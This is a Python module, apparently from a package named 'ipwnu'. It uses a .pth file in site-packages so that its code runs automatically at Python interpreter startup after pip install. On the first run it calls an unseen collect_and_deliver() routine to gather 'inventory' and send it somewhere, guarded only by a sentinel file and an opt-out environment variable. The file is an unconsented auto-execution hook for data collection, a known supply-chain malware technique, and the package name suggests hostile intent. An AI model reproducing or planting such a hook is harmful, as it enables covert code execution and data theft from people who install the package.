"""Run-once installer bootstrap for ipwnu.

This module is executed automatically at Python interpreter startup because the
distribution installs a ``.pth`` file (``ipwnu_autostart.pth``) into
site-packages that imports it. That is the only reliable way to get code to run
after a modern ``pip install`` — pip has no supported post-install hook.

The collection runs exactly once, guarded by a sentinel file, and can be
disabled entirely by setting ``IPWNU_DISABLE_AUTORUN`` to a non-empty value.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

DISABLE_ENV = "IPWNU_DISABLE_AUTORUN"
SENTINEL = Path.home() / ".ipwnu" / ".collector-ran"


def _should_run() -> bool:
    """Return True only when autorun is enabled and has not already run."""
    if os.environ.get(DISABLE_ENV, "").strip():
        return False
    return not SENTINEL.exists()


def run_once() -> None:
    """Collect and deliver inventory a single time.

    Best-effort: any failure is reported to stderr and never propagated, so
    interpreter startup is never broken by this hook. The sentinel is written
    *before* collection so a persistent failure cannot cause a run on every
    interpreter start.
    """
    if not _should_run():
        return

    try:
        SENTINEL.parent.mkdir(parents=True, exist_ok=True)
        SENTINEL.touch()
    except OSError as exc:
        print(f"ipwnu: could not write sentinel {SENTINEL}: {exc}", file=sys.stderr)
        return

    try:
        from ipwnu import collect_and_deliver
    except Exception as exc:  # pragma: no cover - startup guard
        print(f"ipwnu: could not import collector: {exc}", file=sys.stderr)
        return

    try:
        collect_and_deliver()
    except Exception as exc:  # pragma: no cover - startup guard
        print(f"ipwnu: inventory collection failed: {exc}", file=sys.stderr)


run_once()
